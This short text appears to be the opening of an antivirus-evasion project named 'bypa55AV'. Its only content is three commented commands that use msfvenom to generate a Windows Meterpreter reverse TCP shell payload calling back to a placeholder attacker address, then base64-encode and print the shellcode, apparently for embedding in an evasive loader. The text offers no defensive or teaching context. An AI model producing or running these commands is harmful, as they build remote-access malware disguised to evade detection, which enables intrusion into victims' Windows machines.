# bypa55AV
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=5555 -f raw > rev.raw
// base64 -w 0 -i rev.raw > rev.bs64
// cat rev.bs64
